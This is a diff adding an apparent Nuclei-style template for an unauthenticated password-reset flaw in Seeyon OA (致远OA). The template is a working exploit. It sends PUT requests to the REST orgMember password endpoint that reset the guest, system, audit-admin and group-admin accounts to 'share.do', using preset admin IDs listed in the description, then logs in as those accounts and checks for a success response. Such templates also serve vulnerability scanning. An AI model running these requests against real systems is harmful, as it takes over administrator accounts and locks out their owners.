@@ -1,0 +1,56 @@
+id: seeyon-oa-ucpclogin-reset-passwd
+
+info:
+  name: "致远OA rest接口前台密码重置漏洞"
+  author: lbb
+  severity: high
+  description: |
+    致远OA-ucpcLogin密码重置漏洞
+    /**     * 系统管理员预置ID     * @deprecated 角色角色化后，废弃不再使用     */
+    public static final Long SYSTEM_ADMIN_ID = -7273032013234748168L;
+    /**     * 审计管理员预置ID     * @deprecated 角色角色化后，废弃不再使用，8.1后可能删除
+    public static final Long AUDIT_ADMIN_ID = -4401606663639775639L;
+    /**     * 集团管理员预置ID     * @deprecated 角色角色化后，废弃不再使用，8.1后可能删除     */
+    public static final Long GROUP_ADMIN_ID = 5725175934914479521L;
+  reference:
+    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA-ucpcLogin%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md
+  tags: 致远互联-OA
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |+
+        PUT /seeyon/rest/orgMember/{{memberid}}/password/share.do HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        
+    payloads:
+      memberid:
+        - "-6964000252392685202"
+        - "-7273032013234748168"
+        - "-4401606663639775639"
+        - "5725175934914479521"
+  - raw:
+      - |+
+        POST /seeyon/rest/authentication/ucpcLogin?login_username={{name}}&login_password=share.do&ticket= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        
+    payloads:
+      name:
+        - seeyon-guest
+        - system
+        - audit-admin
+        - group-admin
+
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"LoginOK":"ok"'
